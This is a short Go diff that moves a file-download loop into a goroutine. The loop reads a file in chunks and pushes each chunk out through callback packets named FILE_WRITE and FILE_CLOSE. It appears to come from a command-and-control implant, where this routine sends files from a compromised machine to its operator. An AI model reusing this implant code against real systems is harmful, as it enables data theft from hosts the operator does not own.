@@ -157,23 +157,25 @@ func Download(b []byte) error {
 	if err != nil {
 		return err
 	}
-	var fileContent []byte
-	// 1M
-	fileBuf := make([]byte, 1024*1024)
-	for {
-		n, err := fileHandle.Read(fileBuf)
-		if err != nil && err != io.EOF {
-			break
+	go func() {
+		var fileContent []byte
+		// 1M
+		fileBuf := make([]byte, 1024*1024)
+		for {
+			n, err := fileHandle.Read(fileBuf)
+			if err != nil && err != io.EOF {
+				break
+			}
+			if n == 0 {
+				break
+			}
+			fileContent = fileBuf[:n]
+			result = util.BytesCombine(requestIDBytes, fileContent)
+			packet.PushResult(packet.CALLBACK_FILE_WRITE, result)
 		}
-		if n == 0 {
-			break
-		}
-		fileContent = fileBuf[:n]
-		result = util.BytesCombine(requestIDBytes, fileContent)
-		packet.PushResult(packet.CALLBACK_FILE_WRITE, result)
-	}
 
-	packet.PushResult(packet.CALLBACK_FILE_CLOSE, requestIDBytes)
+		packet.PushResult(packet.CALLBACK_FILE_CLOSE, requestIDBytes)
+	}()
 	return nil
 }
 
